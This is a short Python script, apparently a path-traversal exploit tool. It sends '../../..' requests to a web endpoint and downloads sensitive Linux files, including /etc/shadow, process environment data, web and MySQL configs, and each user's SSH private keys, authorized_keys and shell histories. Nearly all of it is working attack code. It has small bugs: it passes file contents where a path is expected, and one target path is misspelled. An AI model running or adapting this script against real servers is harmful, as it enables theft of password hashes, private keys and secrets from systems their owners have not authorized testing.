#coding=utf8
import requests
import os

'''
通过mysql的配置文件得知了数据的存储目录。通过直接读取数据库文件可以获取到数据库内的信息。
'''

linux_path_from_root = '''/etc/shadow
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/hosts
/etc/my.cnf
/proc/self/cmdline
/proc/self/environ
/proc/verison
/proc/self/cwd
/proc/net/arp
/proc/sched_debug
/proc/self/fd/0
/proc/self/fd/1
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
'''.strip().split('\n')

linux_path_from_user_home = '''.viminfo
.bash_history
.mysql_history
.ssh/authorized_keys
.ssh/id_rsa
.ssh/config
.ssh/known_hosts
.zsh_history
'''.strip().split('\n')

linux_useres = []

def parse_etc_passwd(path):
	users = []
	with open(path, 'r') as f:
		data = f.read()
	lines = data.split("\n")
	lines = filter(lambda x:not x.strip().startswith("#"), lines)
	lines = filter(lambda x:'/home/' in x and ('/bin/bash' in x or '/bin/sh' in x or '/bin/zsh' in x), lines)
	for l in lines:
		users.append(l.split(':')[0])
	return users

print parse_etc_passwd('/etc/passwd')


def download(path):
	if not os.path.exists('output'):
		os.mkdir('output')
	url = "http://127.0.0.1/?path=../../.." + path
	response = requests.get(url)
	if response.status_code == 200:
	    with open("output" + os.sep + path.strip('/').replace('/', '_'), 'wb') as f:
	        f.write(response.content)
	return response.text

def linux_exploit():
	data = download('/etc/passwd')
	users = parse_etc_passwd(data)
	for p in linux_path_from_root:
		download(p)
	user_home = ['/home/'+u+'/' for u in users]
	user_home.append('/root/')
	for u in user_home:
		for p in linux_path_from_user_home:
			download(u+p)






